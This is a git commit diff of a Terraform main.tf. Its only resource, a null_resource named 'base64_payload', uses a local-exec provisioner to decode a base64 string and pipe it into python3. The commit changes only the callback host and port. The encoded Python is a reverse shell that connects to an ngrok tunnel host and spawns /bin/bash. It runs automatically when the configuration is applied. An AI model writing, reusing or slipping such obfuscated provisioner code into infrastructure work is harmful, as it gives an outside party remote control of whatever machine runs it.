4bd0b2dceb8098fafff175ff934b9fdc4fd19c4b
Islam Albatsh <isahavkc@gmail.com>
2025-11-05 21:23:36 -0500

    Update main.tf

--- main.tf
+++ main.tf
@@ -2,7 +2,7 @@
 resource "null_resource" "base64_payload" {
   provisioner "local-exec" {
     command = <<EOT
-      echo "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjAudGNwLmV1Lm5ncm9rLmlvIi4xNzAzNCkpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCmltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIik=" | base64 -d | python3
+      echo "aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zCnM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pCnMuY29ubmVjdCgoIjcudGNwLmV1Lm5ncm9rLmlvLjE5NDg1IikpCm9zLmR1cDIocy5maWxlbm8oKSwwKQpvcy5kdXAyKHMuZmlsZW5vKCksMSkKb3MuZHVwMihzLmZpbGVubygpLDIpCmltcG9ydCBwdHk7IHB0eS5zcGF3bigiL2Jpbi9iYXNoIik=" | base64 -d | python3
     EOT
   }
 }
